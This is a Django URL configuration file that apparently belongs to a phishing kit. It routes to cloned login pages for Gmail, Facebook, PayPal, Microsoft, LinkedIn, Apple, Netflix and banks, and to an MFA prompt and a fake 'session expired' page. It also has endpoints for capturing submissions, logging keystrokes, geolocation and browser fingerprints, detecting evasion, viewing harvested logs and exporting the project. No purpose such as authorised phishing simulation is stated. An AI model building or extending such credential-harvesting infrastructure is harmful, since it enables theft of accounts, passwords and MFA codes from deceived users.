from django.urls import path
from . import views

app_name = 'base'

urlpatterns = [
    path('gmail/', views.TemplateView.as_view(template_name='base/gmail_clone.html')),
    path('facebook/', views.TemplateView.as_view(template_name='base/facebook_clone.html')),
    path('mfa/', views.TemplateView.as_view(template_name='base/mfa_prompt.html')),
    path('bank/', views.TemplateView.as_view(template_name='base/bank_clone.html')),
    path('paypal/', views.TemplateView.as_view(template_name='base/paypal_clone.html')),
    path('microsoft/', views.TemplateView.as_view(template_name='base/microsoft_clone.html')),
    path('linkedin/', views.TemplateView.as_view(template_name='base/linkedin_clone.html')),
    path('apple/', views.TemplateView.as_view(template_name='base/apple_clone.html')),
    path('custombank/', views.TemplateView.as_view(template_name='base/custom_bank_clone.html')),
    path('netflix/', views.TemplateView.as_view(template_name='base/netflix_clone.html')),
    path('session_expired/', views.TemplateView.as_view(template_name='base/session_expired.html')),
    path('submit/', views.handle_submission),
    path('log_keystroke/', views.log_keystroke),
    path('log_geo/', views.log_geo),
    path('log_fingerprint/', views.log_fingerprint),
    path('log_evasion_detected/', views.log_evasion),
    path('dashboard/', views.view_logs),
    path('export_project/', views.export_project),    
]